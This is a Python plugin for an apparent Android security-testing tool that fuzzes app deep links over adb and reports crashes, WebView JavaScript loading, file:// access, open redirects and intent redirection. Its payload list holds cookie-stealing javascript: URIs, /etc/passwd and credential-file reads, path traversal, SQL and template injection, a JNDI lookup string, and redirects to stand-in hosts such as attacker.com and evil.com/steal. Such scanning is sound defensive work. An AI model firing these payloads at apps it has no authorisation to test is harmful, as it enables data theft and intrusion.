"""DeepLinkPlugin — fuzz registered deep link schemes and paths."""

from __future__ import annotations

import re
from typing import TYPE_CHECKING

from backend.plugins.base import (
    BasePlugin,
    PluginCategory,
    PluginFinding,
    IntentSpec,
    PoC,
    ValidationVerdict,
)

if TYPE_CHECKING:
    from backend.core.device_manager import DeviceHandle
    from backend.core.apk_analyzer import APKAnalysis


_CRASH_RE = re.compile(
    r"(FATAL EXCEPTION|java\.lang\.\w*Exception|NullPointerException|"
    r"SecurityException|ClassCastException|SIGSEGV|SIGABRT|ANR in)",
    re.IGNORECASE,
)

_WEBVIEW_LOAD_RE = re.compile(
    r"(loadUrl|shouldOverrideUrlLoading|WebViewClient|onPageStarted|"
    r"evaluateJavascript|WebChromeClient|addJavascriptInterface)",
    re.IGNORECASE,
)

_REDIRECT_RE = re.compile(
    r"(Redirecting to|Location:|302|301|intent://|market://)",
    re.IGNORECASE,
)

_PARAM_FUZZ: dict[str, list[str]] = {
    "url": [
        "javascript:alert(document.cookie)",
        "file:///etc/passwd",
        "file:///data/data/{pkg}/shared_prefs/creds.xml",
        "http://attacker.com",
        "https://evil.com/steal?c=",
        "intent://evil#Intent;scheme=http;S.browser_fallback_url=http://attacker.com;end",
        "data:text/html,<script>alert(1)</script>",
    ],
    "redirect": [
        "http://attacker.com",
        "https://evil.com",
        "//attacker.com",
        "/\\attacker.com",
        "https://target.com@attacker.com",
    ],
    "callback": [
        "http://attacker.com/callback",
        "javascript:void(0)",
    ],
    "path": [
        "../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "....//....//etc/passwd",
    ],
    "token": [
        "' OR '1'='1",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
    ],
    "id": [
        "-1", "0", "999999", "' OR 1=1--",
    ],
}


class DeepLinkPlugin(BasePlugin):
    name = "deeplink_fuzzer"
    display_name = "Deep Link Fuzzer"
    description = (
        "Fuzzes all registered deep link schemes/paths. Tests WebView URL loading, "
        "parameter injection, open redirect, and intent redirection via deep links."
    )
    version = "1.0.0"
    category = PluginCategory.FUZZER
    requires_device = True
    attack_vectors = [
        "deeplink_injection",
        "open_redirect",
        "webview_hijack",
        "intent_redirect",
        "javascript_injection",
    ]

    async def run(self, analysis, device, progress_callback=None) -> list[PluginFinding]:
        findings: list[PluginFinding] = []

        deeplinks = self._collect_deeplinks(analysis)
        total = len(deeplinks)
        if not total:
            return findings

        for idx, (comp, scheme, host, path) in enumerate(deeplinks):
            if self.is_cancelled:
                break

            base_uri = self._build_uri(scheme, host, path)

            # 1) Basic deeplink open
            crash_f = await self._test_basic_open(device, analysis.package_name, comp, base_uri)
            if crash_f:
                findings.append(crash_f)

            # 2) JavaScript URI injection
            js_f = await self._test_js_injection(device, analysis.package_name, comp, scheme, host)
            if js_f:
                findings.append(js_f)

            # 3) Parameter fuzzing
            param_findings = await self._test_param_injection(
                device, analysis.package_name, comp, base_uri,
            )
            findings.extend(param_findings)

            # 4) Open redirect tests
            redir_f = await self._test_open_redirect(device, analysis.package_name, comp, base_uri)
            if redir_f:
                findings.append(redir_f)

            # 5) Intent redirect via deep link
            intent_f = await self._test_intent_redirect(
                device, analysis.package_name, comp, scheme,
            )
            if intent_f:
                findings.append(intent_f)

            if progress_callback:
                await progress_callback(
                    plugin=self.name,
                    progress=(idx + 1) / total,
                    message=f"Fuzzed deeplink {base_uri}",
                )

        return findings

    # ------------------------------------------------------------------
    # Collectors
    # ------------------------------------------------------------------
    def _collect_deeplinks(self, analysis) -> list[tuple]:
        """Return list of (component, scheme, host, path) tuples."""
        links: list[tuple] = []
        for comp in analysis.components:
            if comp.type != "activity":
                continue
            for dl in comp.deep_links:
                scheme = dl.get("scheme", "")
                host = dl.get("host", "")
                path = dl.get("path", "") or dl.get("pathPrefix", "")
                if scheme:
                    links.append((comp, scheme, host, path))
            # Also check scheme-level from analysis
        for scheme in analysis.deep_link_schemes:
            links.append((None, scheme, "", ""))
        return links

    @staticmethod
    def _build_uri(scheme: str, host: str, path: str) -> str:
        uri = f"{scheme}://"
        if host:
            uri += host
        if path:
            uri += path if path.startswith("/") else f"/{path}"
        return uri

    # ------------------------------------------------------------------
    # Tests
    # ------------------------------------------------------------------
    async def _test_basic_open(self, device, pkg, comp, uri) -> PluginFinding | None:
        await device.clear_logcat()
        args = ["-a", "android.intent.action.VIEW", "-d", uri]
        out = await device.start_activity(args)
        logcat = await device.logcat_snapshot(lines=300)

        if _CRASH_RE.search(logcat + out):
            return PluginFinding(
                title=f"Crash via deep link: {uri[:80]}",
                description=(
                    f"Opening deep link {uri} causes a crash. "
                    f"Component: {comp.name if comp else 'unknown'}."
                ),
                severity="high",
                component_name=comp.name if comp else "",
                component_type="activity",
                cwe_id="CWE-20",
                mstg_id="MSTG-PLATFORM-2",
                owasp_mobile="M1",
                poc_command=f'adb shell am start -a android.intent.action.VIEW -d "{uri}"',
                logcat_snippet=logcat[-1500:],
            )
        return None

    async def _test_js_injection(self, device, pkg, comp, scheme, host) -> PluginFinding | None:
        """Test if the deep link handler loads a WebView with attacker-controlled URL."""
        js_uri = f"{scheme}://javascript:alert(document.cookie)"
        await device.clear_logcat()
        out = await device.start_activity(
            ["-a", "android.intent.action.VIEW", "-d", js_uri],
        )
        logcat = await device.logcat_snapshot(lines=300)

        if _WEBVIEW_LOAD_RE.search(logcat) and "javascript:" in logcat.lower():
            return PluginFinding(
                title=f"JavaScript URI loaded via deep link — {comp.name if comp else scheme}",
                description=(
                    f"Deep link handler for scheme '{scheme}' passes attacker-controlled "
                    f"URLs to a WebView, enabling javascript: URI execution."
                ),
                severity="high",
                component_name=comp.name if comp else "",
                component_type="activity",
                cvss_score=7.5,
                cwe_id="CWE-79",
                mstg_id="MSTG-PLATFORM-2",
                owasp_mobile="M1",
                poc_command=f'adb shell am start -a android.intent.action.VIEW -d "{js_uri}"',
                logcat_snippet=logcat[-1500:],
            )

        # Also test file:// protocol
        file_uri = f"{scheme}://{host}/redirect?url=file:///etc/passwd"
        await device.clear_logcat()
        await device.start_activity(
            ["-a", "android.intent.action.VIEW", "-d", file_uri],
        )
        logcat = await device.logcat_snapshot(lines=300)
        if "file://" in logcat and ("loadUrl" in logcat or "shouldOverride" in logcat):
            return PluginFinding(
                title=f"file:// protocol access via deep link — {comp.name if comp else scheme}",
                description=(
                    f"Deep link handler allows loading file:// URIs through URL parameter, "
                    f"enabling local file access."
                ),
                severity="high",
                component_name=comp.name if comp else "",
                component_type="activity",
                cvss_score=7.5,
                cwe_id="CWE-200",
                mstg_id="MSTG-PLATFORM-2",
                owasp_mobile="M1",
                poc_command=f'adb shell am start -a android.intent.action.VIEW -d "{file_uri}"',
                logcat_snippet=logcat[-1500:],
            )
        return None

    async def _test_param_injection(self, device, pkg, comp, base_uri) -> list[PluginFinding]:
        results: list[PluginFinding] = []
        for param_name, payloads in _PARAM_FUZZ.items():
            for payload in payloads:
                if self.is_cancelled:
                    return results
                payload_filled = payload.replace("{pkg}", pkg)
                test_uri = f"{base_uri}?{param_name}={payload_filled}"
                await device.clear_logcat()
                out = await device.start_activity(
                    ["-a", "android.intent.action.VIEW", "-d", test_uri],
                )
                logcat = await device.logcat_snapshot(lines=200)
                combined = logcat + out

                if _CRASH_RE.search(combined):
                    results.append(PluginFinding(
                        title=f"Crash via deep link param injection: {param_name}",
                        description=(
                            f"Injecting '{payload_filled}' into parameter '{param_name}' "
                            f"of deep link {base_uri} causes a crash."
                        ),
                        severity="high",
                        component_name=comp.name if comp else "",
                        component_type="activity",
                        cwe_id="CWE-20",
                        mstg_id="MSTG-PLATFORM-2",
                        owasp_mobile="M1",
                        poc_command=f'adb shell am start -a android.intent.action.VIEW -d "{test_uri}"',
                        logcat_snippet=logcat[-1500:],
                    ))
                    break  # one crash per param is enough
        return results

    async def _test_open_redirect(self, device, pkg, comp, base_uri) -> PluginFinding | None:
        for redirect_payload in _PARAM_FUZZ["redirect"]:
            uri = f"{base_uri}?redirect_url={redirect_payload}&next={redirect_payload}&url={redirect_payload}"
            await device.clear_logcat()
            await device.start_activity(
                ["-a", "android.intent.action.VIEW", "-d", uri],
            )
            logcat = await device.logcat_snapshot(lines=200)
            if _REDIRECT_RE.search(logcat) and "attacker.com" in logcat:
                return PluginFinding(
                    title=f"Open redirect via deep link — {comp.name if comp else base_uri[:40]}",
                    description=(
                        f"Deep link at {base_uri} follows redirects to attacker-controlled "
                        f"URLs via redirect/next/url parameters."
                    ),
                    severity="medium",
                    component_name=comp.name if comp else "",
                    component_type="activity",
                    cvss_score=6.1,
                    cwe_id="CWE-601",
                    mstg_id="MSTG-PLATFORM-2",
                    owasp_mobile="M1",
                    poc_command=f'adb shell am start -a android.intent.action.VIEW -d "{uri}"',
                    logcat_snippet=logcat[-1500:],
                )
        return None

    async def _test_intent_redirect(self, device, pkg, comp, scheme) -> PluginFinding | None:
        """Test intent:// scheme redirect via deep link."""
        intent_uri = (
            f"intent://evil#Intent;"
            f"scheme={scheme};"
            f"component={pkg}/.InternalActivity;"
            f"S.url=http://attacker.com;"
            f"end"
        )
        await device.clear_logcat()
        await device.start_activity(
            ["-a", "android.intent.action.VIEW", "-d", intent_uri],
        )
        logcat = await device.logcat_snapshot(lines=200)
        if "InternalActivity" in logcat or "attacker.com" in logcat:
            return PluginFinding(
                title=f"Intent redirect via deep link — scheme:{scheme}",
                description=(
                    f"Deep link scheme '{scheme}' can be abused to redirect intents "
                    f"to internal/private activities via intent:// URIs."
                ),
                severity="high",
                component_name=comp.name if comp else "",
                component_type="activity",
                cvss_score=7.5,
                cwe_id="CWE-926",
                mstg_id="MSTG-PLATFORM-2",
                owasp_mobile="M1",
                poc_command=f'adb shell am start -a android.intent.action.VIEW -d "{intent_uri}"',
                logcat_snippet=logcat[-1500:],
            )
        return None

    async def generate_poc(self, finding: PluginFinding) -> PoC | None:
        if finding.poc_command:
            return PoC(
                poc_type="adb_command",
                commands=[finding.poc_command],
                expected_result="Crash, redirect to attacker, or JS execution in WebView",
            )
        return None
